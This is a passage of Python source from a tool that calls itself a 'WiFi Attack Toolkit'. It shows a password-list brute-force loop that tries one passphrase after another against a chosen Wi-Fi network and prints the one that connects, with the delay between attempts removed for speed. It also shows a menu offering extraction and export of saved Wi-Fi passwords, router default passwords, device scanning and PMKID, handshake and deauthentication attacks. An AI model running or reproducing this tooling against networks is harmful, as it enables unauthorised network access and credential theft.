        print(f"Initiating brute force on: [bold yellow]{self.target_id}[/] with: [bold yellow]{len(passwords)}[/] passwords.")
        confirm = input("Proceed with brute-force attack? (y/n): ")
        if confirm.lower() != 'y':
            print("Brute-force attack aborted.")
            return False

        success = False
        try:
            with Progress() as progress:
                task = progress.add_task("Brute Forcing...", total=len(passwords))

                for passphrase in passwords:
                    self.create_wifi_profile_xml(passphrase.strip())  # Ensure no whitespace issues
                    if self.connect_wifi_and_verify_with_interface():
                        print(f"Success! Connected to {self.target_id} with password: {passphrase}")
                        success = True
                        break  # Exit loop on success

                    progress.update(task, advance=1)
                    # sleep(1)  # Removed for speed

                if not success:
                    print(f"Brute force failed. Could not connect to {self.target_id}")

                return success

        except Exception as e:
            print(f"Error during brute force attack: {e}")
            return False


def main():
    try:
        os.system("color")
        wifi_brute_forcer = WifiBruteForces()
        title = pyfiglet.figlet_format("Wi-Fi BruteForcer", font="slant")
        print(f"[bold cyan]{title}[/]")
        wifi_brute_forcer.clearscr()

        # Main menu
        while True:
            print("\n[bold cyan]═══════════════════════════════════════════[/]")
            print("[bold cyan]           WiFi Attack Toolkit              [/]")
            print("[bold cyan]═══════════════════════════════════════════[/]")
            print("\n[bold yellow]Attack Options:[/]")
            print("  1. Brute Force Attack (Scan & Attack)")
            print("\n[bold yellow]Reconnaissance:[/]")
            print("  2. Extract Saved WiFi Passwords")
            print("  3. Show Open/Weak Networks")
            print("  4. Signal Strength Monitor")
            print("  5. Scan Connected Devices (ARP)")
            print("\n[bold yellow]Utilities:[/]")
            print("  6. Generate WiFi QR Code")
            print("  7. Show Router Default Passwords")
            print("  8. Export All Saved Profiles")
            print("  9. Generate WLAN Report (Admin)")
            print("\n[bold yellow]Advanced (Requires WSL):[/]")
            print("  10. Advanced Attacks (PMKID/Handshake/Deauth)")
            print("\n[bold yellow]Info:[/]")
            print("  11. Credits")
            print("  0. Exit")
            print("[bold cyan]═══════════════════════════════════════════[/]")

            choice = input("\nSelect option: ")

            if choice == "1":
                # Original brute force flow
                interface_list = wifi_brute_forcer.get_network_interfaces()
                wifi_brute_forcer.render_interfaces_table()
                wifi_brute_forcer.select_interface()
                break
            elif choice == "2":
                wifi_brute_forcer.extract_saved_passwords()
                continue
            elif choice == "3":
                wifi_brute_forcer.show_open_networks()
                continue
            elif choice == "4":
                wifi_brute_forcer.signal_strength_monitor()
                continue
            elif choice == "5":
                wifi_brute_forcer.show_connected_devices()
                continue
            elif choice == "6":
                wifi_brute_forcer.generate_qr_code()
                continue
            elif choice == "7":
                wifi_brute_forcer.show_router_defaults()
                continue
            elif choice == "8":
                wifi_brute_forcer.export_all_profiles()
                continue
            elif choice == "9":
                wifi_brute_forcer.generate_wlan_report()
                continue
            elif choice == "10":
                wifi_brute_forcer.launch_wsl_toolkit()
                continue
            elif choice == "11":
                wifi_brute_forcer.show_credits()
                continue
            elif choice == "0":
                print("Goodbye!")
                return
            else:
                print("[bold red]Invalid option[/]")
                continue

        # Initial scan
        wifi_brute_forcer.get_wifi_networks()

        while True:
            wifi_brute_forcer.render_json_as_table()
            result = wifi_brute_forcer.selection_process()

            if result == "selected":
                break
            elif result == "rescan":
                print("[bold yellow]Rescanning networks...[/]")
                wifi_brute_forcer.get_wifi_networks()
                continue
            elif result == "credits":
                wifi_brute_forcer.show_credits()
                wifi_brute_forcer.clearscr()
                continue
            else:
                return

        wifi_brute_forcer.select_attack_mode()
        wifi_brute_forcer.brute_force_wifi()
    except Exception as e:
        print(f"Error in main function: {e}")


if __name__ == "__main__":
    main()
